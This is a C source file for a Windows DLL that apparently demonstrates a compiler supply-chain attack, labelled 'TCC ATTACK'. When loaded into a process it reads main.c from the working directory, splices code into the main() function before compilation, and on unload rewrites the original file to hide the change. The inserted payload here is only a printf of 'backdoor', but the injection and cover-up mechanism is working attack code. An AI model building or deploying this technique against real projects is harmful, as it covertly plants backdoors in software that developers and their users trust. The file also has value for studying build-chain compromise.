#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char MAIN_FUNCTION_FLAG[] = "\nint main(int argc, char* argv[]) {";
char MALWARE_CODE[] = "\nprintf(\"backdoor\\n\");\n";

char TARGET_FILE[1024] = {0};
char OLD_CODE_BUFFER[1024] = {0};

int readFile(char* path, char* data) {
    FILE* fp = fopen(path, "r");
    int n = fread(data, 1, 1024, fp);

    fclose(fp);
    return n;
}

int writeFile(char* path, char* data) {
    FILE* fp = fopen(path, "w");
    int n = fwrite(data, 1, strlen(data), fp);

    fclose(fp);
    return n;
}
    
int Active() {
    printf("TCC ATTACK START\n");

    // get project source directory
    char workDirectory[MAX_PATH] = {0};
    getcwd(workDirectory, MAX_PATH);
    printf("source directory: %s\n", workDirectory);

    char data[1024] = {0};
    sprintf(TARGET_FILE, "%s/%s", workDirectory, "main.c");
    readFile(TARGET_FILE, data);
    strcpy(OLD_CODE_BUFFER, data);
    
    // find "int main ..." position
    char* pos = strstr(data, MAIN_FUNCTION_FLAG);
    if (pos == NULL) {
        return 0;
    }
    pos += strlen(MAIN_FUNCTION_FLAG);
    *(pos-1) = '\0';

    // insert malware code
    char malware[2048] = {0};
    // header + '{' + malware + tail
    sprintf(malware, "%s%c%s%s", data, '{', MALWARE_CODE, pos+1);
    printf("write malware code into file\n");
    writeFile(TARGET_FILE, malware);

    printf("waiting compile...\n");
    return 0;
}

int Inactive() {
    printf("TCC ATTACK END\n");
    printf("restore the original code\n");
    writeFile(TARGET_FILE, OLD_CODE_BUFFER);
    return 0;
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
            // Initialize once for each new process.
            // Return FALSE to fail DLL load.
            Active();
            break;

        case DLL_THREAD_ATTACH:
            // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
            // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
            // Perform any necessary cleanup.
            Inactive();
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
